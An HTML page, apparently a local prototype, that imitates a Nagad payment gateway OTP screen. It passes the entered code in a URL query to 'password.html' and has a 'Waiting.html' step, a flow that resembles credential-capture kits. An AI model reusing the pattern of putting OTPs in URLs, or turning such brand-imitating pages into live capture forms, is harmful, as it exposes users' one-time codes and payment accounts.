<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OTP Verification - Nagad Payment Gateway</title>
    <style>
        /* GLOBAL STYLES */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f0f0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        /* MAIN CONTAINER */
        .pgw-container {
            width: 360px;
            background: linear-gradient(180deg, #8B0000 0%, #D22B2B 100%);
            border-radius: 8px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
            color: white;
            padding: 20px;
            position: relative;
            text-align: center;
        }

        /* HEADER */
        .header-top {
            display: flex;
            justify-content: flex-end;
            margin-bottom: 20px;
        }

        .lang-toggle {
            background: #b22222;
            border: 1px solid white;
            border-radius: 4px;
            padding: 4px 8px;
            font-size: 12px;
            cursor: pointer;
            transition: background 0.2s;
        }

        .lang-toggle:hover {
            background: #8B0000;
        }

        .merchant-logo img {
            width: 80px;
            margin-bottom: 10px;
            filter: brightness(0) invert(1);
        }

        .merchant-name {
            font-size: 18px;
            font-weight: bold;
            margin-bottom: 30px;
        }

        /* INVOICE DETAILS */
        .details-box {
            text-align: left;
            font-size: 14px;
            margin-bottom: 40px;
            line-height: 1.8;
        }

        .details-box div {
            margin-bottom: 8px;
        }

        .label {
            font-weight: bold;
            opacity: 0.95;
        }

        /* INPUT SECTION */
        .input-label {
            display: block;
            font-weight: bold;
            margin-bottom: 10px;
            font-size: 14px;
        }

        .input-group {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 4px;
            margin-bottom: 30px;
        }

        .digit-input {
            width: 28px;
            height: 35px;
            border: none;
            border-radius: 4px;
            text-align: center;
            font-size: 18px;
            font-weight: bold;
            color: #333;
            background-color: white;
            transition: outline 0.2s;
        }

        .digit-input:focus {
            outline: 2px solid #ffcc00;
        }

        .dash {
            font-weight: bold;
            font-size: 20px;
            color: white;
        }

        /* TERMS & CONDITIONS */
        .terms {
            font-size: 13px;
            margin-bottom: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 8px;
        }

        .terms input[type="checkbox"] {
            cursor: pointer;
        }

        /* BUTTONS */
        .btn-group {
            display: flex;
            justify-content: space-between;
            gap: 15px;
            margin-bottom: 20px;
        }

        .btn {
            flex: 1;
            padding: 10px;
            border: none;
            border-radius: 5px;
            font-weight: bold;
            font-size: 14px;
            cursor: pointer;
            background-color: white;
            color: #8B0000;
            transition: background 0.2s;
        }

        .btn:hover {
            background-color: #e8e8e8;
        }

        .btn:active {
            transform: scale(0.98);
        }

        /* FOOTER LOGO */
        .footer-logo {
            margin-top: 10px;
            width: 80px;
        }

        /* SHAKE ANIMATION (ERROR) */
        .shake {
            animation: shake 0.5s;
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            50% { transform: translateX(5px); }
            75% { transform: translateX(-5px); }
        }

        /* CONFIRMATION OVERLAY */
        .confirmation {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            display: none;
            align-items: center;
            justify-content: center;
            background-color: rgba(0, 0, 0, 0.3);
            border-radius: 8px;
            z-index: 10;
        }

        .confirmation.show {
            display: flex;
        }

        .confirm-inner {
            background: white;
            color: #111;
            padding: 24px;
            border-radius: 8px;
            width: 90%;
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.2);
            text-align: center;
        }

        .confirm-title {
            font-size: 18px;
            font-weight: 700;
            color: #0a7f2a;
            margin-bottom: 8px;
        }

        .confirm-sub {
            color: #555;
            font-size: 14px;
            margin-bottom: 14px;
        }

        .confirm-inner .btn {
            margin-top: 16px;
        }
    </style>
</head>
<body>

    <!-- Main OTP Verification Form Container -->
    <div class="pgw-container" id="mainContainer">

        <!-- Confirmation Overlay (Hidden by Default) -->
        <div id="confirmation" class="confirmation" aria-hidden="true">
            <div class="confirm-inner">
                <div id="confTitle" class="confirm-title">OTP Verified</div>
                <div id="confSub" class="confirm-sub">Details</div>
                <button id="confirmDone" class="btn">Done</button>
            </div>
        </div>

        <!-- Header with Language Toggle -->
        <div class="header-top">
            <span class="lang-toggle">বাং | Eng</span>
        </div>

        <!-- Merchant Information -->
        <div class="merchant-logo">
            <img src="C:\Users\shahriar.shaon\Desktop\Button\Untitled design (1).png" alt="Merchant">
        </div>
        <div class="merchant-name">Merchant Payment</div>

        <!-- Invoice Details -->
        <div class="details-box">
            <div><span class="label">Invoice No:</span> *******************</div>
            <div><span class="label">Total Amount:</span> BDT *******</div>
            <div><span class="label">Charge:</span> BDT ***</div>
        </div>

        <!-- OTP Input -->
        <label class="input-label">Enter 6-Digit OTP</label>
        <div class="input-group" id="otpContainer">
            <input type="text" class="digit-input" maxlength="1" inputmode="numeric">
            <input type="text" class="digit-input" maxlength="1" inputmode="numeric">
            <input type="text" class="digit-input" maxlength="1" inputmode="numeric">
            
            <span class="dash">-</span>

            <input type="text" class="digit-input" maxlength="1" inputmode="numeric">
            <input type="text" class="digit-input" maxlength="1" inputmode="numeric">
            <input type="text" class="digit-input" maxlength="1" inputmode="numeric">
        </div>

        <!-- Action Buttons -->
        <div class="btn-group">
            <button class="btn" id="btnProceed">Proceed</button>
            <button class="btn" id="btnClose">Close</button>
        </div>

        <!-- Footer Logo -->
        <img src="C:\Users\shahriar.shaon\Desktop\Button\image001.gif" class="footer-logo" alt="Nagad">

    </div>

    <script>
        // Wait for the page to fully load before running JavaScript
        document.addEventListener('DOMContentLoaded', function () {
            initializeForm();
        });

        // Initialize all form functionality
        function initializeForm() {
            // Get all HTML elements we need
            const digitInputs = document.querySelectorAll('.digit-input');
            const proceedButton = document.getElementById('btnProceed');
            const closeButton = document.getElementById('btnClose');
            const termsCheckbox = document.getElementById('termsCheck');
            const mainContainer = document.getElementById('mainContainer');

            // Set up input field behavior
            setupDigitInputs(digitInputs);

            // Set up button click handlers
            proceedButton.addEventListener('click', function () {
                handleProceedClick(digitInputs, termsCheckbox, mainContainer);
            });

            closeButton.addEventListener('click', function () {
                handleCloseClick();
            });

            // Check if we're returning from the waiting page with results
            checkForCompletionResults();
        }

        // Setup digit input fields - handle typing, backspace, and paste
        function setupDigitInputs(inputs) {
            inputs.forEach(function (input, index) {
                // When user types in the field
                input.addEventListener('input', function (event) {
                    const value = event.target.value;

                    // Only allow numbers
                    if (!isNumeric(value)) {
                        event.target.value = '';
                        return;
                    }

                    // If a digit was entered, move to the next field
                    if (value.length === 1) {
                        if (index < inputs.length - 1) {
                            inputs[index + 1].focus();
                        } else {
                            // Last field was filled, blur it
                            input.blur();
                        }
                    }
                });

                // When user presses backspace
                input.addEventListener('keydown', function (event) {
                    if (event.key === 'Backspace' && event.target.value === '') {
                        // Move to the previous field
                        if (index > 0) {
                            inputs[index - 1].focus();
                        }
                    }
                });

                // When user pastes text
                input.addEventListener('paste', function (event) {
                    event.preventDefault();

                    // Get pasted text and extract only numbers
                    const pastedText = event.clipboardData.getData('text');
                    const numbersOnly = pastedText.replace(/\D/g, '');

                    if (!numbersOnly) return;

                    // Fill fields starting from current position
                    let charIndex = 0;
                    for (let i = index; i < inputs.length && charIndex < numbersOnly.length; i++) {
                        inputs[i].value = numbersOnly[charIndex];
                        charIndex++;
                    }

                    // Focus the next empty field
                    const nextField = index + charIndex;
                    if (nextField < inputs.length) {
                        inputs[nextField].focus();
                    } else {
                        inputs[inputs.length - 1].focus();
                    }
                });
            });
        }

        // Check if a string contains only numbers
        function isNumeric(str) {
            return /^\d*$/.test(str);
        }

        // Handle Proceed button click
        function handleProceedClick(inputs, termsCheckbox, container) {
            // Get all entered digits
            let otpCode = '';
            let allFieldsFilled = true;

            inputs.forEach(function (input) {
                otpCode += input.value;
                if (input.value === '') {
                    allFieldsFilled = false;
                }
            });

            // Validate: all fields must be filled
            if (!allFieldsFilled) {
                alert('Please enter the full 6-digit OTP.');
                shakeContainer(container);
                return;
            }

            // Everything is valid - redirect to waiting page
            const password = 'password.html?action=proceed&otp=' + encodeURIComponent(otpCode);
            window.location.href = password;
        }

        // Handle Close button click
        function handleCloseClick() {
            // Redirect to waiting page with close action
            const waitingPageURL = 'Waiting.html?action=close';
            window.location.href = waitingPageURL;
        }

        // Add shake animation to container (used for errors)
        function shakeContainer(container) {
            container.classList.add('shake');
            setTimeout(function () {
                container.classList.remove('shake');
            }, 500);
        }

        // Get URL query parameters as an object
        function getURLParameters() {
            const params = {};
            const queryString = location.search.replace('?', '');

            if (!queryString) return params;

            queryString.split('&').forEach(function (pair) {
                if (!pair) return;

                const [key, value] = pair.split('=');
                params[decodeURIComponent(key)] = value ? decodeURIComponent(value) : '';
            });

            return params;
        }

        // Check if we're returning from waiting page and show confirmation
        function checkForCompletionResults() {
            const params = getURLParameters();

            // Only show confirmation if we have completion results
            if (params.action !== 'completed') {
                return;
            }

            showConfirmationOverlay(params);
        }

        // Display the confirmation overlay
        function showConfirmationOverlay(params) {
            const confirmationDiv = document.getElementById('confirmation');
            const titleElement = document.getElementById('confTitle');
            const messageElement = document.getElementById('confSub');
            const doneButton = document.getElementById('confirmDone');

            // Set title and message based on status
            if (params.status === 'success') {
                titleElement.textContent = 'OTP Verified';
                const otpDisplay = params.otp ? 'OTP: ' + params.otp : 'OTP verified successfully.';
                messageElement.textContent = otpDisplay;
            } else {
                titleElement.textContent = 'Verification Cancelled';
                messageElement.textContent = 'The OTP verification was cancelled.';
            }

            // Show the confirmation overlay
            confirmationDiv.classList.add('show');
            confirmationDiv.setAttribute('aria-hidden', 'false');

            // When user clicks Done, return to clean form
            doneButton.addEventListener('click', function () {
                window.location.href = 'otp.html';
            });
        }
    </script>

</body>
</html>
